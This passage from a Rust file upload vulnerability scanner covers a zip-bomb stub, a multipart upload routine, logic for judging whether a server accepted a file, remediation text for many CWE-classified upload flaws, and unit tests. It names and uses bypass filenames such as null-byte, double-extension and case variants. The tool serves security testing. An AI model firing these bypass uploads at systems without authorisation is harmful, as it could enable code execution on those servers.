        bomb.push_str("\x14\x00\x00\x00\x08\x00"); // Compression method: deflate

        // Add compressed data that expands significantly
        // This is intentionally small for safety
        for _ in 0..100 {
            bomb.push_str(&"0".repeat(100));
        }

        bomb
    }

    /// Upload a file and check if accepted
    async fn upload_file(
        &self,
        url: &str,
        filename: &str,
        content: &str,
        mime_type: &str,
    ) -> anyhow::Result<(bool, String)> {
        // Create multipart form data
        let boundary = format!("----WebKitFormBoundary{}", uuid::Uuid::new_v4());
        let form_data = format!(
            "--{}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\nContent-Type: {}\r\n\r\n{}\r\n--{}--\r\n",
            boundary, filename, mime_type, content, boundary
        );

        let headers = vec![
            ("Content-Type".to_string(), format!("multipart/form-data; boundary={}", boundary)),
        ];

        match self.http_client.post_with_headers(url, &form_data, headers).await {
            Ok(response) => {
                let accepted = self.is_upload_accepted(&response.body, response.status_code);
                let evidence = if accepted {
                    format!("File {} accepted. Status: {}", filename, response.status_code)
                } else {
                    "File rejected".to_string()
                };
                Ok((accepted, evidence))
            }
            Err(e) => {
                debug!("Upload request failed: {}", e);
                Ok((false, "Request failed".to_string()))
            }
        }
    }

    /// Check if upload was accepted based on response
    fn is_upload_accepted(&self, body: &str, status: u16) -> bool {
        // First check for SPA/single-page-application fallback (returns same HTML for all routes)
        // SPAs often return 200 for all routes and render client-side - NOT a real upload acceptance
        let is_spa_response = body.contains("<app-root>") ||
            body.contains("<div id=\"root\">") ||
            body.contains("<div id=\"app\">") ||
            body.contains("__NEXT_DATA__") ||
            body.contains("__NUXT__") ||
            body.contains("ng-version=") ||
            body.contains("polyfills.js") ||
            body.contains("data-reactroot") ||
            body.contains("/_next/static/") ||
            (body.contains("<!DOCTYPE html>") && body.contains("<script") && body.len() > 5000);

        if is_spa_response {
            return false;
        }

        // Check for soft 404 - server returns 200 but body shows error
        let body_lower = body.to_lowercase();
        let is_soft_error = body_lower.contains("not found") ||
            body_lower.contains("404") ||
            body_lower.contains("does not exist") ||
            body_lower.contains("file not found") ||
            body_lower.contains("page not found") ||
            body_lower.contains("resource not found") ||
            body_lower.contains("cannot be found") ||
            body_lower.contains("forbidden") ||
            body_lower.contains("access denied") ||
            body_lower.contains("unauthorized") ||
            body_lower.contains("not allowed") ||
            // Multi-language 404 patterns
            body_lower.contains("sivua ei löydy") ||  // Finnish
            body_lower.contains("sivu ei löytynyt") ||  // Finnish variant
            body_lower.contains("seite nicht gefunden") ||  // German
            body_lower.contains("página no encontrada") ||  // Spanish
            body_lower.contains("page introuvable") ||  // French
            body_lower.contains("pagina niet gevonden") ||  // Dutch
            (body_lower.contains("error") && body.len() < 1000 && !body_lower.contains("success"));

        if is_soft_error {
            return false;
        }

        // Check status codes - but only if response looks like an API response, not HTML
        if matches!(status, 200 | 201 | 204) {
            // If the response is HTML, it's likely a SPA fallback, not a real upload acceptance
            if body.contains("<!DOCTYPE") || body.contains("<html") {
                return false;
            }
            return true;
        }

        // Check for success messages
        let success_patterns = vec![
            r"upload.*success",
            r"file.*uploaded",
            r"successfully.*saved",
            r"file.*accepted",
            r#""success":\s*true"#,
            r#""uploaded":\s*true"#,
        ];

        for pattern in success_patterns {
            if let Ok(regex) = regex::Regex::new(&format!("(?i){}", pattern)) {
                if regex.is_match(body) {
                    return true;
                }
            }
        }

        false
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        vuln_type: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        severity: Severity,
        cvss: f64,
    ) -> Vulnerability {
        let (cwe, remediation) = match vuln_type {
            "FILE_UPLOAD_DANGEROUS_TYPE" => (
                "CWE-434",
                "1. Implement allowlist of safe file extensions\n\
                 2. Validate file content (magic bytes), not just extension\n\
                 3. Store uploads outside web root\n\
                 4. Use random filenames to prevent direct access\n\
                 5. Implement file type detection based on content\n\
                 6. Scan uploaded files for malware\n\
                 7. Set proper file permissions (non-executable)",
            ),
            "FILE_UPLOAD_DOUBLE_EXTENSION" => (
                "CWE-434",
                "1. Validate file extensions properly using last extension\n\
                 2. Remove or replace multiple extensions\n\
                 3. Use allowlist validation\n\
                 4. Normalize filenames before processing\n\
                 5. Implement content-based validation",
            ),
            "FILE_UPLOAD_MIME_BYPASS" => (
                "CWE-434",
                "1. Never trust client-provided MIME types\n\
                 2. Validate file content using magic bytes\n\
                 3. Use file type detection libraries\n\
                 4. Implement server-side file type verification\n\
                 5. Combine multiple validation methods",
            ),
            "FILE_UPLOAD_NULL_BYTE" => (
                "CWE-158",
                "1. Sanitize filenames to remove null bytes\n\
                 2. Use modern file handling functions\n\
                 3. Validate filename length and characters\n\
                 4. Reject filenames with null bytes\n\
                 5. Update to latest runtime versions",
            ),
            "FILE_UPLOAD_CASE_BYPASS" => (
                "CWE-434",
                "1. Perform case-insensitive extension validation\n\
                 2. Convert extensions to lowercase before checking\n\
                 3. Use allowlist approach\n\
                 4. Implement consistent filename normalization",
            ),
            "FILE_UPLOAD_MAGIC_BYTE_GIF" | "FILE_UPLOAD_MAGIC_BYTE_PNG" | "FILE_UPLOAD_MAGIC_BYTE_JPEG" => (
                "CWE-434",
                "1. Validate BOTH file content AND extension\n\
                 2. Do not rely solely on magic bytes for validation\n\
                 3. Strip or reject files with embedded code\n\
                 4. Store uploads outside web root\n\
                 5. Do not execute uploaded files directly\n\
                 6. Use Content-Disposition: attachment for downloads\n\
                 7. Implement strict Content-Type headers",
            ),
            "FILE_UPLOAD_SVG_XSS" => (
                "CWE-79",
                "1. Sanitize SVG files to remove script tags\n\
                 2. Set Content-Security-Policy headers\n\
                 3. Serve uploads from separate domain\n\
                 4. Use Content-Disposition: attachment\n\
                 5. Consider converting SVG to raster format\n\
                 6. Validate and sanitize all SVG content",
            ),
            "FILE_UPLOAD_GIF_POLYGLOT" | "FILE_UPLOAD_PNG_POLYGLOT" => (
                "CWE-434",
                "1. Validate file format strictly - reject polyglots\n\
                 2. Re-encode images server-side to strip metadata\n\
                 3. Use image processing libraries to validate structure\n\
                 4. Store uploads outside web root\n\
                 5. Never execute uploaded files\n\
                 6. Implement strict file type detection",
            ),
            "FILE_UPLOAD_ZIP_SLIP" => (
                "CWE-22",
                "1. Validate all archive entry paths before extraction\n\
                 2. Reject paths containing '../' or absolute paths\n\
                 3. Extract to temporary isolated directory\n\
                 4. Verify extracted files stay within allowed directory\n\
                 5. Use safe archive extraction libraries\n\
                 6. Implement path canonicalization checks",
            ),
            "FILE_UPLOAD_ZIP_BOMB" => (
                "CWE-409",
                "1. Implement decompression size limits\n\
                 2. Set maximum file count in archives\n\
                 3. Use compression ratio checks\n\
                 4. Implement timeout for extraction\n\
                 5. Monitor resource usage during extraction\n\
                 6. Reject nested archives beyond depth limit",
            ),
            "FILE_UPLOAD_SVG_XXE" | "FILE_UPLOAD_SVG_XXE_SSRF" => (
                "CWE-611",
                "1. Disable external entity resolution in XML parser\n\
                 2. Use safe XML parsing configurations\n\
                 3. Validate and sanitize SVG content\n\
                 4. Convert SVG to raster format\n\
                 5. Set LIBXML_NOENT and LIBXML_DTDLOAD flags\n\
                 6. Use allowlist for SVG elements and attributes",
            ),
            "FILE_UPLOAD_SVG_SSRF" | "FILE_UPLOAD_SVG_SSRF_LOCAL" => (
                "CWE-918",
                "1. Sanitize SVG to remove external references\n\
                 2. Block image/use tags with external URLs\n\
                 3. Implement URL validation and allowlist\n\
                 4. Use network segmentation\n\
                 5. Convert SVG to raster format\n\
                 6. Validate all xlink:href attributes",
            ),
            "FILE_UPLOAD_ADVANCED_DOUBLE_EXT" => (
                "CWE-434",
                "1. Implement robust extension parsing\n\
                 2. Strip all special characters from filenames\n\
                 3. Validate against null bytes and control characters\n\
                 4. Use allowlist for file extensions\n\
                 5. Normalize filenames completely\n\
                 6. Reject files with multiple dots in suspicious positions",
            ),
            "FILE_UPLOAD_MIME_CONFUSION_PHP" | "FILE_UPLOAD_MIME_CONFUSION_EXT" => (
                "CWE-434",
                "1. Validate BOTH MIME type AND file extension\n\
                 2. Do not trust client-provided Content-Type\n\
                 3. Use server-side file type detection\n\
                 4. Implement consistent validation logic\n\
                 5. Store uploads outside web root\n\
                 6. Reject mismatched MIME/extension combinations",
            ),
            _ => (
                "CWE-434",
                "1. Implement comprehensive file upload validation\n\
                 2. Use allowlist approach for file types\n\
                 3. Validate both extension and content\n\
                 4. Store uploads securely",
            ),
        };

        Vulnerability {
            id: format!("file_upload_{}", uuid::Uuid::new_v4()),
            vuln_type: vuln_type.to_string(),
            severity,
            confidence: Confidence::High,
            category: "File Upload".to_string(),
            url: url.to_string(),
            parameter: Some("file".to_string()),
            payload: payload.to_string(),
            description: description.to_string(),
            evidence: Some(evidence.to_string()),
            cwe: cwe.to_string(),
            cvss: cvss as f32,
            verified: true,
            false_positive: false,
            remediation: remediation.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;
    use std::fmt;

    pub struct Uuid(String);

    impl Uuid {
        pub fn new_v4() -> Self {
            let mut rng = rand::rng();
            let uuid_str = format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            );
            Uuid(uuid_str)
        }
    }

    impl fmt::Display for Uuid {
        fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
            write!(f, "{}", self.0)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> FileUploadScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        FileUploadScanner::new(http_client)
    }

    #[test]
    fn test_is_upload_accepted_status_200() {
        let scanner = create_test_scanner();
        assert!(scanner.is_upload_accepted("", 200));
    }

    #[test]
    fn test_is_upload_accepted_status_201() {
        let scanner = create_test_scanner();
        assert!(scanner.is_upload_accepted("", 201));
    }

    #[test]
    fn test_is_upload_accepted_success_message() {
        let scanner = create_test_scanner();
        assert!(scanner.is_upload_accepted("upload successful", 200));
        assert!(scanner.is_upload_accepted("file uploaded successfully", 200));
        assert!(scanner.is_upload_accepted("{\"success\": true}", 200));
    }

    #[test]
    fn test_is_upload_rejected() {
        let scanner = create_test_scanner();
        assert!(!scanner.is_upload_accepted("error: invalid file type", 400));
        assert!(!scanner.is_upload_accepted("file rejected", 403));
    }

    #[test]
    fn test_create_vulnerability_dangerous_type() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/upload",
            "FILE_UPLOAD_DANGEROUS_TYPE",
            "test.php",
            "Server accepts dangerous file type: PHP",
            "File test.php accepted. Status: 200",
            Severity::Critical,
            9.8,
        );

        assert_eq!(vuln.vuln_type, "FILE_UPLOAD_DANGEROUS_TYPE");
        assert_eq!(vuln.severity, Severity::Critical);
        assert_eq!(vuln.cwe, "CWE-434");
        assert_eq!(vuln.cvss, 9.8);
        assert!(vuln.verified);
    }

    #[test]
    fn test_create_vulnerability_double_extension() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/upload",
            "FILE_UPLOAD_DOUBLE_EXTENSION",
            "test.php.jpg",
            "Server vulnerable to double extension bypass",
            "File accepted",
            Severity::Critical,
            9.0,
        );

        assert_eq!(vuln.vuln_type, "FILE_UPLOAD_DOUBLE_EXTENSION");
        assert_eq!(vuln.severity, Severity::Critical);
        assert!(vuln.remediation.contains("last extension"));
    }

    #[test]
    fn test_create_vulnerability_mime_bypass() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/upload",
            "FILE_UPLOAD_MIME_BYPASS",
            "test.php",
            "Server trusts client-provided MIME type",
            "File accepted with fake MIME type",
            Severity::Critical,
            8.8,
        );

        assert_eq!(vuln.cwe, "CWE-434");
        assert!(vuln.remediation.contains("magic bytes"));
        assert!(vuln.remediation.contains("Never trust client-provided"));
    }

    #[test]
    fn test_create_vulnerability_null_byte() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/upload",
            "FILE_UPLOAD_NULL_BYTE",
            "test.php%00.jpg",
            "Server vulnerable to null byte injection",
            "Null byte bypass successful",
            Severity::Critical,
            8.5,
        );

        assert_eq!(vuln.cwe, "CWE-158");
        assert!(vuln.remediation.contains("null bytes"));
    }

    #[test]
    fn test_create_vulnerability_case_bypass() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/upload",
            "FILE_UPLOAD_CASE_BYPASS",
            "test.PHP",
            "Server vulnerable to case sensitivity bypass",
            "Case bypass successful",
            Severity::High,
            7.5,
        );

        assert_eq!(vuln.severity, Severity::High);
        assert!(vuln.remediation.contains("case-insensitive"));
    }
}
